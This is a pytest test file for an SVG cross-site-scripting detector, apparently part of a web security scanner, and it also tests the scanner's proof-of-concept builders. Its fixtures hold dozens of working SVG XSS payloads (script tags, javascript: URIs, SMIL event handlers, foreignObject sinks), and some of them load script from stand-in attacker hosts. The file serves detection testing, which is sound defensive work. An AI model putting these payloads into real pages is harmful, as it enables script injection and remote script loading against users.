"""Unit tests for Phase 30-4: SVG-based XSS detection.

Tests cover the new svg_xss module:
  * SVG <script> variants (inline, external, javascript: URI)
  * <foreignObject> with embedded HTML sinks
  * <use href="javascript:"> / data: / external
  * SMIL <set>/<animate>/<animateTransform>/<animateMotion> writing to
    event handlers and href
  * SMIL onbegin/onend/onrepeat inline event handlers
  * <a href="javascript:"> inside SVG
  * <image href="javascript:"> / data:
  * <handler> / <listener> (SVG 1.1 / 1.2)
  * <discard> with javascript: href
  * Generic SVG onload / onclick / event handlers
  * SVG <style> with expression / -moz-binding / behavior
  * <text> / <tref> / <altGlyph> with javascript: href

Each pattern is tested for:
  1. Positive detection (the vector snippet is flagged).
  2. Negative control (safe SVG usage produces no findings).
  3. analyze_svg() correctly classifies the page as exploitable.
  4. build_poc_svg() / build_poc_html() return non-empty PoCs.
"""
from __future__ import annotations

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from xssentinel.core import svg_xss as svg


# ---------------------------------------------------------------------------
# Fixture HTML samples -- SVG XSS vectors
# ---------------------------------------------------------------------------

SVG_SCRIPT_INLINE = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    '<script>alert("XSS")</script>'
    '<rect width="100" height="100"/>'
    '</svg>'
)

SVG_SCRIPT_EXTERNAL = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<script xlink:href="https://attacker.example/x.js"/>'
    '</svg>'
)

SVG_SCRIPT_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<script xlink:href="javascript:alert(1)"/>'
    '</svg>'
)

SVG_FOREIGNOBJECT_SCRIPT = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<foreignObject width="100%" height="100%">'
    '<body xmlns="http://www.w3.org/1999/xhtml">'
    '<script>alert(1)</script>'
    '</body></foreignObject></svg>'
)

SVG_FOREIGNOBJECT_IFRAME = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<foreignObject width="100%" height="100%">'
    '<body xmlns="http://www.w3.org/1999/xhtml">'
    '<iframe src="javascript:alert(1)"></iframe>'
    '</body></foreignObject></svg>'
)

SVG_FOREIGNOBJECT_EVENT = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<foreignObject width="100%" height="100%">'
    '<body xmlns="http://www.w3.org/1999/xhtml">'
    '<div onload="alert(1)">x</div>'
    '</body></foreignObject></svg>'
)

SVG_FOREIGNOBJECT_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<foreignObject width="100%" height="100%">'
    '<body xmlns="http://www.w3.org/1999/xhtml">'
    '<a href="javascript:alert(1)">click</a>'
    '</body></foreignObject></svg>'
)

SVG_FOREIGNOBJECT_BARE = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<foreignObject width="100%" height="100%">'
    '<p>just text</p>'
    '</foreignObject></svg>'
)

SVG_USE_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<use xlink:href="javascript:alert(1)"/>'
    '</svg>'
)

SVG_USE_DATA = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<use xlink:href="data:image/svg+xml,&lt;svg/&gt;"/>'
    '</svg>'
)

SVG_USE_EXTERNAL = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<use xlink:href="https://attacker.example/evil.svg#fragment"/>'
    '</svg>'
)

SVG_SET_EVENT = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<set attributeName="onload" to="alert(1)"/>'
    '<rect width="100" height="100"/>'
    '</svg>'
)

SVG_SET_HREF_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<a xlink:href="javascript:void(0)">'
    '<set attributeName="xlink:href" to="javascript:alert(1)"/>'
    'click</a></svg>'
)

SVG_ANIMATE_EVENT = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<animate attributeName="onload" to="alert(1)" dur="1s"/>'
    '<rect width="100" height="100"/>'
    '</svg>'
)

SVG_ANIMATE_HREF_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<a xlink:href="javascript:void(0)">'
    '<animate attributeName="xlink:href" '
    'values="javascript:alert(1)" dur="1s"/>click</a></svg>'
)

SVG_ANIMATETRANSFORM_EVENT = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<animateTransform attributeName="onload" to="alert(1)" '
    'type="rotate" dur="1s"/>'
    '<rect width="100" height="100"/>'
    '</svg>'
)

SVG_ANIMATEMOTION_EVENT = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<animateMotion onbegin="alert(1)" dur="1s" path="M0,0 L100,100"/>'
    '<rect width="10" height="10"/>'
    '</svg>'
)

SVG_SMIL_ONBEGIN = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<set onbegin="alert(1)" attributeName="x" to="0" dur="1s"/>'
    '<rect width="100" height="100"/>'
    '</svg>'
)

SVG_SMIL_ONEND = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<set onend="alert(1)" attributeName="x" to="0" dur="1s"/>'
    '<rect width="100" height="100"/>'
    '</svg>'
)

SVG_SMIL_ONREPEAT = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<animate onrepeat="alert(1)" attributeName="x" '
    'from="0" to="100" dur="1s" repeatCount="3"/>'
    '<rect width="100" height="100"/>'
    '</svg>'
)

SVG_A_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<a xlink:href="javascript:alert(1)">'
    '<text>click</text></a></svg>'
)

SVG_A_DATA = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<a xlink:href="data:text/html,<script>alert(1)</script>">'
    '<text>click</text></a></svg>'
)

SVG_IMAGE_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<image xlink:href="javascript:alert(1)" width="100" height="100"/>'
    '</svg>'
)

SVG_IMAGE_DATA = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<image xlink:href="data:image/png;base64,iVBORw0KGgo=" '
    'width="100" height="100"/></svg>'
)

SVG_HANDLER = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:ev="http://www.w3.org/2001/xml-events">'
    '<rect width="100" height="100">'
    '<handler ev:event="click" type="application/ecmascript">'
    'alert(1)</handler></rect></svg>'
)

SVG_LISTENER = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:ev="http://www.w3.org/2001/xml-events">'
    '<listener handler="#h1" event="ev:click"/>'
    '<rect width="100" height="100"/></svg>'
)

SVG_DISCARD_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<discard href="javascript:alert(1)" begin="0s"/>'
    '<rect width="100" height="100"/></svg>'
)

SVG_DISCARD_BARE = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<discard href="#rect1" begin="2s"/>'
    '<rect id="rect1" width="100" height="100"/></svg>'
)

SVG_ONLOAD = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'onload="alert(1)">'
    '<rect width="100" height="100"/></svg>'
)

SVG_ONCLICK = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<rect width="100" height="100" onclick="alert(1)"/>'
    '</svg>'
)

SVG_STYLE_EXPRESSION = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<style>rect{x:expression(alert(1))}</style>'
    '<rect width="100" height="100"/></svg>'
)

SVG_STYLE_MOZBINDING = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<style>rect{-moz-binding:url(http://attacker/x.xml)}</style>'
    '<rect width="100" height="100"/></svg>'
)

SVG_STYLE_BEHAVIOR = (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<style>rect{behavior:url(http://attacker/x.htc)}</style>'
    '<rect width="100" height="100"/></svg>'
)

SVG_TEXT_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<text xlink:href="javascript:alert(1)">click</text></svg>'
)

SVG_TREF_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<tref xlink:href="javascript:alert(1)"/>'
    '<text>label</text></svg>'
)

SVG_ALTGLYPH_JSURI = (
    '<svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink">'
    '<altGlyph xlink:href="javascript:alert(1)">A</altGlyph></svg>'
)

# Negative control: safe SVG with no script/event-handler/javascript: URIs.
SVG_SAFE = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    '<rect x="10" y="10" width="80" height="80" fill="blue"/>'
    '<circle cx="50" cy="50" r="20" fill="red"/>'
    '<path d="M10,10 L90,90" stroke="green" stroke-width="2"/>'
    '<text x="50" y="50" text-anchor="middle">Hello</text>'
    '</svg>'
)


# ---------------------------------------------------------------------------
# Test classes
# ---------------------------------------------------------------------------

class TestSvgScriptPatterns:
    def test_inline_script_detected(self):
        findings = svg.analyze_svg(SVG_SCRIPT_INLINE)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_script" in types, f"svg_script not detected: {types}"

    def test_external_script_detected(self):
        findings = svg.analyze_svg(SVG_SCRIPT_EXTERNAL)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_script_external" in types, \
            f"svg_script_external not detected: {types}"

    def test_jsuri_script_detected(self):
        findings = svg.analyze_svg(SVG_SCRIPT_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_script_jsuri" in types, \
            f"svg_script_jsuri not detected: {types}"


class TestForeignObjectPatterns:
    def test_foreignobject_script_detected(self):
        findings = svg.analyze_svg(SVG_FOREIGNOBJECT_SCRIPT)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_foreignobject_script" in types, \
            f"svg_foreignobject_script not detected: {types}"

    def test_foreignobject_iframe_detected(self):
        findings = svg.analyze_svg(SVG_FOREIGNOBJECT_IFRAME)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_foreignobject_iframe" in types, \
            f"svg_foreignobject_iframe not detected: {types}"

    def test_foreignobject_event_detected(self):
        findings = svg.analyze_svg(SVG_FOREIGNOBJECT_EVENT)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_foreignobject_event" in types, \
            f"svg_foreignobject_event not detected: {types}"

    def test_foreignobject_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_FOREIGNOBJECT_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_foreignobject_jsuri" in types, \
            f"svg_foreignobject_jsuri not detected: {types}"

    def test_bare_foreignobject_detected_as_medium(self):
        findings = svg.analyze_svg(SVG_FOREIGNOBJECT_BARE)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_foreignobject" in types, \
            f"bare svg_foreignobject not detected: {types}"


class TestUsePatterns:
    def test_use_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_USE_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_use_jsuri" in types, \
            f"svg_use_jsuri not detected: {types}"

    def test_use_data_detected(self):
        findings = svg.analyze_svg(SVG_USE_DATA)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_use_data" in types, \
            f"svg_use_data not detected: {types}"

    def test_use_external_detected(self):
        findings = svg.analyze_svg(SVG_USE_EXTERNAL)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_use_external" in types, \
            f"svg_use_external not detected: {types}"


class TestSmilPatterns:
    def test_set_event_detected(self):
        findings = svg.analyze_svg(SVG_SET_EVENT)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_set_event" in types, \
            f"svg_set_event not detected: {types}"

    def test_set_href_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_SET_HREF_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_set_href_jsuri" in types, \
            f"svg_set_href_jsuri not detected: {types}"

    def test_animate_event_detected(self):
        findings = svg.analyze_svg(SVG_ANIMATE_EVENT)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_animate_event" in types, \
            f"svg_animate_event not detected: {types}"

    def test_animate_href_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_ANIMATE_HREF_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_animate_href_jsuri" in types, \
            f"svg_animate_href_jsuri not detected: {types}"

    def test_animatetransform_event_detected(self):
        findings = svg.analyze_svg(SVG_ANIMATETRANSFORM_EVENT)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_animatetransform_event" in types, \
            f"svg_animatetransform_event not detected: {types}"

    def test_animatemotion_event_detected(self):
        findings = svg.analyze_svg(SVG_ANIMATEMOTION_EVENT)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_animatemotion_event" in types, \
            f"svg_animatemotion_event not detected: {types}"

    def test_smil_onbegin_detected(self):
        findings = svg.analyze_svg(SVG_SMIL_ONBEGIN)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_smil_onbegin" in types, \
            f"svg_smil_onbegin not detected: {types}"

    def test_smil_onend_detected(self):
        findings = svg.analyze_svg(SVG_SMIL_ONEND)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_smil_onend" in types, \
            f"svg_smil_onend not detected: {types}"

    def test_smil_onrepeat_detected(self):
        findings = svg.analyze_svg(SVG_SMIL_ONREPEAT)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_smil_onrepeat" in types, \
            f"svg_smil_onrepeat not detected: {types}"


class TestAnchorAndImagePatterns:
    def test_a_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_A_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_a_jsuri" in types, \
            f"svg_a_jsuri not detected: {types}"

    def test_a_data_detected(self):
        findings = svg.analyze_svg(SVG_A_DATA)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_a_data" in types, \
            f"svg_a_data not detected: {types}"

    def test_image_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_IMAGE_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_image_jsuri" in types, \
            f"svg_image_jsuri not detected: {types}"

    def test_image_data_detected(self):
        findings = svg.analyze_svg(SVG_IMAGE_DATA)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_image_data" in types, \
            f"svg_image_data not detected: {types}"


class TestHandlerListenerPatterns:
    def test_handler_detected(self):
        findings = svg.analyze_svg(SVG_HANDLER)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_handler" in types, \
            f"svg_handler not detected: {types}"

    def test_listener_detected(self):
        findings = svg.analyze_svg(SVG_LISTENER)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_listener" in types, \
            f"svg_listener not detected: {types}"


class TestDiscardPatterns:
    def test_discard_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_DISCARD_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_discard_jsuri" in types, \
            f"svg_discard_jsuri not detected: {types}"

    def test_bare_discard_detected_as_low(self):
        findings = svg.analyze_svg(SVG_DISCARD_BARE)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_discard" in types, \
            f"bare svg_discard not detected: {types}"
        # Verify severity is low for the bare discard.
        discard_findings = [f for f in findings if f["vector_type"] == "svg_discard"]
        assert all(f["severity"] == "low" for f in discard_findings)


class TestEventHandlers:
    def test_onload_detected(self):
        findings = svg.analyze_svg(SVG_ONLOAD)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_onload" in types, \
            f"svg_onload not detected: {types}"

    def test_onclick_detected(self):
        findings = svg.analyze_svg(SVG_ONCLICK)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_onclick" in types, \
            f"svg_onclick not detected: {types}"


class TestStylePatterns:
    def test_style_expression_detected(self):
        findings = svg.analyze_svg(SVG_STYLE_EXPRESSION)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_style_expression" in types, \
            f"svg_style_expression not detected: {types}"

    def test_style_mozbinding_detected(self):
        findings = svg.analyze_svg(SVG_STYLE_MOZBINDING)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_style_mozbinding" in types, \
            f"svg_style_mozbinding not detected: {types}"

    def test_style_behavior_detected(self):
        findings = svg.analyze_svg(SVG_STYLE_BEHAVIOR)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_style_behavior" in types, \
            f"svg_style_behavior not detected: {types}"


class TestTextAndGlyphPatterns:
    def test_text_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_TEXT_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_text_jsuri" in types, \
            f"svg_text_jsuri not detected: {types}"

    def test_tref_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_TREF_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_tref_jsuri" in types, \
            f"svg_tref_jsuri not detected: {types}"

    def test_altglyph_jsuri_detected(self):
        findings = svg.analyze_svg(SVG_ALTGLYPH_JSURI)["findings"]
        types = [f["vector_type"] for f in findings]
        assert "svg_altglyph_jsuri" in types, \
            f"svg_altglyph_jsuri not detected: {types}"


class TestAnalyzePage:
    def test_svg_script_page_exploitable(self):
        result = svg.analyze_svg(SVG_SCRIPT_INLINE)
        assert result["exploitable"] is True
        assert result["vulnerable_count"] > 0

    def test_use_jsuri_page_exploitable(self):
        result = svg.analyze_svg(SVG_USE_JSURI)
        assert result["exploitable"] is True

    def test_smil_page_exploitable(self):
        result = svg.analyze_svg(SVG_SET_EVENT)
        assert result["exploitable"] is True

    def test_safe_page_not_exploitable(self):
        result = svg.analyze_svg(SVG_SAFE)
        assert result["exploitable"] is False
        assert result["vulnerable_count"] == 0

    def test_empty_page(self):
        result = svg.analyze_svg("")
        assert result["exploitable"] is False
        assert result["vulnerable_count"] == 0
        assert result["findings"] == []

    def test_none_page(self):
        result = svg.analyze_svg(None)
        assert result["exploitable"] is False
        assert result["vulnerable_count"] == 0


class TestViolationStructure:
    def test_each_finding_has_required_keys(self):
        for sample in [SVG_SCRIPT_INLINE, SVG_USE_JSURI, SVG_SET_EVENT,
                       SVG_FOREIGNOBJECT_SCRIPT, SVG_A_JSURI]:
            result = svg.analyze_svg(sample)
            for f in result["findings"]:
                assert "pattern" in f
                assert "description" in f
                assert "severity" in f
                assert "vector_type" in f
                assert "snippet" in f

    def test_severity_is_valid(self):
        valid_sevs = {"high", "medium", "low"}
        for sample in [SVG_SCRIPT_INLINE, SVG_USE_JSURI, SVG_DISCARD_BARE,
                       SVG_SAFE, SVG_A_DATA]:
            result = svg.analyze_svg(sample)
            for f in result["findings"]:
                assert f["severity"] in valid_sevs, \
                    f"invalid severity '{f['severity']}' for {f['vector_type']}"

    def test_vector_types_unique_in_summary(self):
        result = svg.analyze_svg(SVG_SCRIPT_INLINE + SVG_USE_JSURI)
        vector_types = result["vector_types"]
        assert vector_types == sorted(set(vector_types))


class TestBuildPoc:
    @pytest.mark.parametrize("vector_type", [
        "svg_script", "svg_script_external", "svg_script_jsuri",
        "svg_foreignobject_script", "svg_foreignobject_iframe",
        "svg_foreignobject_event", "svg_foreignobject_jsuri",
        "svg_use_jsuri", "svg_use_data",
        "svg_set_event", "svg_set_href_jsuri",
        "svg_animate_event", "svg_animate_href_jsuri",
        "svg_animatetransform_event", "svg_animatemotion_event",
        "svg_smil_onbegin",
        "svg_a_jsuri", "svg_image_jsuri", "svg_handler",
        "svg_discard_jsuri", "svg_onload",
        "svg_style_expression", "svg_text_jsuri",
    ])
    def test_poc_svg_returns_nonempty_string(self, vector_type):
        poc = svg.build_poc_svg(vector_type)
        assert poc, f"empty PoC for {vector_type}"
        assert "<?xml" in poc
        assert "<svg" in poc

    @pytest.mark.parametrize("vector_type", [
        "svg_script", "svg_use_jsuri", "svg_set_event",
        "svg_foreignobject_script", "svg_a_jsuri",
    ])
    def test_poc_html_returns_nonempty_string(self, vector_type):
        poc = svg.build_poc_html("http://target.example/vuln", vector_type)
        assert poc, f"empty HTML PoC for {vector_type}"
        assert "<!DOCTYPE html>" in poc
        assert "<svg" in poc
        assert "http://target.example/vuln" in poc

    def test_unknown_vector_type_returns_empty_svg(self):
        assert svg.build_poc_svg("nonexistent_vector") == ""

    def test_unknown_vector_type_returns_empty_html(self):
        assert svg.build_poc_html("http://t", "nonexistent_vector") == ""

    def test_empty_url_returns_nonempty_html(self):
        # Empty URL should still produce a PoC (target link is just empty).
        poc = svg.build_poc_html("", "svg_script")
        assert poc  # should still produce a PoC

    def test_poc_contains_xss_marker(self):
        poc = svg.build_poc_svg("svg_script")
        assert "XSS:svg_script" in poc, \
            "PoC should contain a unique XSS marker for verification"

    def test_poc_html_embeds_svg_payload(self):
        poc = svg.build_poc_html("http://t", "svg_use_jsuri")
        # The HTML PoC should embed the SVG payload inline.
        assert "javascript:alert" in poc
        assert "svg-frame" in poc  # CSS class for the SVG container


class TestSupportedVectorTypes:
    def test_supported_vector_types_is_sorted_list(self):
        types = svg.supported_vector_types()
        assert isinstance(types, list)
        assert types == sorted(types)
        assert len(types) > 0

    def test_supported_vector_types_subset_of_pattern_types(self):
        """Every supported vector type (with PoC) should also have a
        matching pattern in SVG_XSS_PATTERNS."""
        pattern_types = {p[3] for p in svg.SVG_XSS_PATTERNS}
        for vtype in svg.supported_vector_types():
            assert vtype in pattern_types, \
                f"PoC vector type '{vtype}' has no matching pattern"


class TestDedupBehavior:
    def test_overlapping_matches_deduplicated(self):
        """When two patterns match the same span, only one finding is
        returned (the first match wins)."""
        # SVG_SCRIPT_INLINE has both <svg><script> (svg_script) and a
        # generic svg_onload check would also match if there was an onload
        # attribute.  Here we just verify the dedup logic doesn't produce
        # excessive duplicates.
        result = svg.analyze_svg(SVG_SCRIPT_INLINE)
        # All findings should have unique (vector_type) -- dedup ensures
        # we don't return the same vector_type twice.
        vtypes = [f["vector_type"] for f in result["findings"]]
        assert len(vtypes) == len(set(vtypes)), \
            f"duplicate vector_types in findings: {vtypes}"
